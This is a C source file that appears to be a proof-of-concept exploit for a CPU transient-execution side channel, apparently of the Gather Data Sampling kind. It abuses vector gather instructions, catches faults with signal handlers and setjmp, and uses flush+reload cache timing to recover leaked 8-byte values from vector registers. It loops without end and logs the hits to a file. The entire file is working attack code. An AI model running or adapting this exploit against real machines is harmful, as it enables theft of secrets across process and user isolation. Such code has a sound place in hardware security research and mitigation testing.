#include <setjmp.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "cacheutils.h"
#include "config.h"
#include "lib.h"

#define BYTE_TRY 8
#define PAGE_SIZE 4096

extern uint8_t *oracles;

uint64_t permQ[4];
uint32_t permD[8];

#if VPGATHERQQ
#define currentCall s_load_encode_qq
#elif VPGATHERDD
#define currentCall s_load_encode_dd
#endif
#define currentIterator 4
#define currentPerm permQ
#define currentType uint64_t

extern void s_load_encode_qq(currentType *array);
extern void s_load_encode_dd(currentType *array);

// For catching when the program gets terminated
// Just writes the hits to mapOut.txt
void intHandler(int dummy) {
  printf("\n");
  map_dump();
  exit(0);
}

int main(int argc, char *argv[]) {
  // Installs the intHandler upon crashes
  // Installs another handler for SIGSEGV & SIGFPE
  // which makes the program try again upon fauling
  // for making an invalid memory lookup in s_load_encode
  // See cacheutils.h for more info
  signal(SIGINT, intHandler);
  signal(SIGSEGV, trycatch_segfault_handler);
  signal(SIGFPE, trycatch_segfault_handler);

  // Calibrates the CACHE_MISS threshold
  // Can also be hardcoded to around 180
  CACHE_MISS = detect_flush_reload_threshold();
  printf("CACHE_MISS \t%lu\n", CACHE_MISS);

  // C++ function which creates 4 maps
  // one for each QWORD in an ymm register
  map_create();

  // Keep track of what index QWORD we're leaking
  int currentRotation = 0;
  // Array of hits, terminated by 00 hex for strlen
  char indexes[BYTE_TRY + 1];
  while (1) {
    // Just keep cycling between leaking 1st..4th QWORD
    currentRotation = (currentRotation + 1) % currentIterator;

#if PERMQ
    for (int i = 0; i < currentIterator; i++) {
      currentPerm[i] = (currentRotation + i) % currentIterator;
    }
#elif PERMD
    for (int i = 0; i < currentIterator; i++) {
      currentPerm[i * 2] = (currentRotation + i) % (currentIterator * 2);
      currentPerm[i * 2 + 1] =
          (currentRotation + i + 1) % (currentIterator * 2);
    }
#endif

    // Call load_encode depending on if our
    // transient window has closed or not
    if (!setjmp(trycatch_buf)) {
      currentCall(currentPerm);
    }
    // Remove previous potential leaked QWORDs
    memset(indexes, 0, BYTE_TRY + 1);

    // Check for leakage for all 8 bytes
    for (size_t c = 0; c < BYTE_TRY; c++) {
      for (size_t i = 0; i < 256; i++) {
        int mix_i = i;
        uint64_t time = flush_reload_t(
            ((uint8_t *)&oracles + (mix_i + (c * 256)) * PAGE_SIZE));

        if (time < CACHE_MISS) {
          indexes[c] = mix_i;
        }
      }
    }

    // See if we got 8 bytes
    // If so, put it in the right map
    size_t l = strlen(indexes);
    if (l >= MIN_BYTES) {
      map_increment(currentRotation, indexes);
    }
  }
  intHandler(1);
}
